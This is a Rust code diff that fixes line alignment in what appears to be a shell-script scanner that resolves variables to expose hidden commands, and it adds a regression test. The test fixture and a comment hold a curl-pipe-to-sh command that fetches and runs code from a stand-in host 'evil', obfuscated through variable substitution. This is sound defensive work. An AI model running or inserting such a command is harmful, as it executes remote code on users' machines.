@@ -633,7 +633,15 @@ pub fn resolve_variables(content: &str) -> String {
     for (idx, phys) in content.lines().enumerate() {
         let lineno = idx + 1;
         if let Some(resolved) = resolved_at.get(&lineno) {
-            out.push(resolved.clone());
+            // A substituted value can carry line breaks (`printf 'a\nb'`
+            // decodes to two lines). Emitting them verbatim shifted every later
+            // resolved line down, so callers that align by line number matched
+            // each line against the wrong variant and lost the last ones off the
+            // end: one `x=$(printf 'a\nb\nc')` plus a use of `$x` hid a
+            // `$c URL | sh` below it entirely. Flatten the breaks into command
+            // separators, as the inline-payload decoder already does, so the
+            // output keeps exactly one line per input line.
+            out.push(resolved.replace(['\r', '\n'], "; "));
         } else if continuation_lines.contains(&lineno) {
             // This physical line was spliced into a logical line emitted above;
             // blank it to keep the 1:1 line count without duplicating content.
@@ -978,5 +986,15 @@ mod tests {
         assert!(!is_build_var("x"));
         assert!(!is_build_var("c"));
         assert!(!is_build_var("cmd"));
+    }
+
+    #[test]
+    fn a_decoded_line_break_cannot_shift_later_lines() {
+        // Regression: a printf-decoded value with `\n` in it added physical
+        // lines to the resolved text, misaligning everything after it.
+        let src = "x=$(printf 'a\\nb\\nc\\nd')\n: $x\nc=curl\n$c https://evil | sh";
+        let out = resolve_variables(src);
+        assert_eq!(out.lines().count(), src.lines().count(), "got:\n{out}");
+        assert_eq!(out.lines().last(), Some("curl https://evil | sh"));
     }
 }
